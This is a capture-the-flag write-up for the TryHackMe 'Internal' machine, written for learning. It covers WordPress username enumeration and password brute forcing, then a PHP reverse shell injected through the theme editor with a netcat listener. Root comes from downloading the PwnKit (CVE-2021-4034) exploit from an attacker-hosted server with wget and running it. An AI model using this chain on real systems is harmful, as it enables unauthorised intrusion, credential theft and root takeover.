---
title: "Internal - TryHackMe"
date: 2026-04-06 02:00:00 +0000
categories: [TryHackMe, Writeups]
tags: [wordpress, CVE-2021-4034, brute-force]
image: /assets/img/writeups/covers/internal.jpeg
---
# Internal — TryHackMe Write-up
![1.png](/assets/img/writeups/internal/1.png)

**Platform:** TryHackMe<br>**Difficulty:** Hard<br>**Category:** Web Application

---

## Summary

Internal is a hard-difficulty TryHackMe machine. It involves enumerating a WordPress site, brute forcing credentials, injecting a PHP reverse shell through the theme editor, pivoting to another user, and finally escalating to root using a well-known `CVE-2021-4034` in `pkexec`.

---

## Tools Used

- nmap
- gobuster
- Caido
- Netcat
- curl / wget
- python3
- [PwnKit (CVE 2021-4034) exploit](https://github.com/ly4k/PwnKit)

---

## Step 1 — Add to /etc/hosts

Before starting, add the target to `/etc/hosts` so the domain resolves:

```
$ echo "10.49.149.80 internal.thm" >> /etc/hosts
```

---

## Step 2 — Nmap Scan

I started with an nmap scan to find open ports and running services:

```
$ nmap -p- 10.49.149.80 -sV -T4
Starting Nmap 7.98 ( https://nmap.org ) at 2026-04-06 08:41 +0500
Nmap scan report for internal.thm (10.49.149.80)
Host is up (0.074s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 37.52 seconds
````

**Results:**

| Port | Service |
|------|---------|
| 22   | SSH     |
| 80   | HTTP    |

A web server is running on port 80. Let's check it out.

---

## Step 3 — Web Enumeration

Visiting `http://internal.thm` in the browser showed the default **Apache2 Ubuntu Default Page** — nothing useful on the surface.

![1.png](/assets/img/writeups/internal/2.png)

I ran **gobuster** to find hidden directories:

```
$ gobuster dir -u http://internal.thm -w /usr/share/wordlists/dirb/common.txt -x php,txt -t 60
```

**Result:** A `/blog` directory was found.

![1.png](/assets/img/writeups/internal/gobuster.png)

Visiting `http://internal.thm/blog` revealed a **WordPress** website.
![1.png](/assets/img/writeups/internal/blog.png)

---

## Step 4 — Finding the Username

Scrolling through the blog, I found a **Login** button which took me to the WordPress login page at `/wp-login.php`.<br><br>I started by guessing default credentials:

- Tried `administrator` / `password123` → Error: *Unknown username*
- Tried `admin` / `password123` → Error: *The password you entered for the username admin is incorrect*
![1.png](/assets/img/writeups/internal/admin.png)

This is actually useful information. WordPress tells you whether the username exists or not through its error messages. The second error confirmed that **admin** is a valid username. Now I just needed the password.<br><br>I also noticed there was **no rate limiting** on the login page — meaning I could try as many passwords as I wanted without getting blocked.

---

## Step 5 — Brute Forcing the Password with Caido

I captured the WordPress login POST request using **Caido** (a web proxy tool similar to Burp Suite).

![1.png](/assets/img/writeups/internal/caido.png)

In Caido's **Automate** section, I set the `password` field as the placeholder for brute forcing and loaded `rockyou.txt` as the wordlist.<br><br>After running through around 10,000 requests, I filtered results by **response length** — a different length means a different server response, which usually means a successful login.

![1.png](/assets/img/writeups/internal/3.png)

I found the password. I logged in with `admin` and the cracked password.

![1.png](/assets/img/writeups/internal/back.png)
![1.png](/assets/img/writeups/internal/dashboard.png)

---

## Step 6 — PHP Reverse Shell via Theme Editor

Once inside the WordPress dashboard, I navigated to:<br>**Appearance → Theme Editor**<br><br>I selected the theme **Twenty Seventeen** and opened `functions.php`.<br><br>I added a [PHP reverse shell](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php) there and configured these two things:

- My attacker IP
- My chosen port (e.g. 1234)
![1.png](/assets/img/writeups/internal/4.png)

I set up a listener on my attacker machine:

```
$ nc -lvnp 1234
```

Then I saved the file and triggered the shell by visiting:

```
http://internal.thm/blog/wp-content/themes/twentyseventeen/functions.php
```

![1.png](/assets/img/writeups/internal/5.png)

I now successfully established a reverse shell.

---

## Step 7 — Finding Aubreanna's Password

I tried to access the user flag:

```
$ cat /home/aubreanna/user.txt
```

It was owned by the user **aubreanna** — I didn't have permission yet.<br>I searched around the system for any stored credentials. After some digging, I found a file in `/opt`:

```
$ cat /opt/wp-save.txt
```

![1.png](/assets/img/writeups/internal/6.png)

It contained aubreanna's password in plaintext.

---

## Step 8 — Upgrading to a Full TTY Shell

When I tried to switch users with `su aubreanna`, I got an error. This is because the shell I had wasn't fully interactive. I upgraded it using Python:

```
$ python3 -c 'import pty; pty.spawn("/bin/bash")'
```

Now I could properly switch users:

```
su aubreanna
```

I entered the password found in `wp-save.txt` and successfully switched to aubreanna.

![1.png](/assets/img/writeups/internal/7.png)

I grabbed the user flag:

```
$ cat /home/aubreanna/user.txt
```

---

## Step 9 — Privilege Escalation to Root

Now I needed to escalate to root.

I checked sudo permissions first:

```
$ sudo -l
```

`aubreanna` was not allowed to run sudo. So I searched for **SUID binaries** — files that run with elevated permissions regardless of who executes them:

```
$ find / -perm -u=s -type f 2>/dev/null
```

![1.png](/assets/img/writeups/internal/8.png)

The list was long. I went through the results one by one and tested anything that looked promising. After some trial and error, I found that **pkexec** was exploitable.

---

## Step 10 — Exploiting pkexec (CVE-2021-4034)

Searching for `pkexec CVE` on Google led me to a [GitHub repository](https://github.com/ly4k/PwnKit) demonstrating **CVE-2021-4034** — also known as **PwnKit**. This is a real-world vulnerability in `pkexec` that allows any local user to gain root privileges.

![1.png](/assets/img/writeups/internal/9.png)
The exploit usage was straightforward and explained in the repo's README.
![1.png](/assets/img/writeups/internal/10.png)

**On my attacker machine**, I downloaded the PwnKit (either download it using the provided curl command in the README or manually open the PwnKit file from the repository and it will automatically download) exploit binary and served it over HTTP:

```
$ python3 -m http.server 80
```

````
$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/)
...

````

**On the target machine**, I downloaded the file:

```
$ wget http://192.168.146.174:80/PwnKit
```

Then gave it execute permission:

```
$ chmod +x PwnKit
```

Then ran it:

```
$ ./PwnKit
```

![1.png](/assets/img/writeups/internal/11.png)

I was now root. I grabbed the final flag:

```
$ cat /root/root.txt
```

---

## Vulnerability Summary

| Vulnerability | Location | Impact |
|---|---|---|
| WordPress Username Enumeration | Login error messages | Confirmed valid username |
| No Rate Limiting | WordPress login page | Allowed brute force attack |
| PHP Code Injection | Theme editor (functions.php) | Remote code execution |
| Plaintext Credentials | /opt/wp-save.txt | User account takeover |
| CVE-2021-4034 (PwnKit) | pkexec SUID binary | Full root access |

---

*Write-up by monasx0 | TryHackMe: [https://tryhackme.com/p/monasx0]*
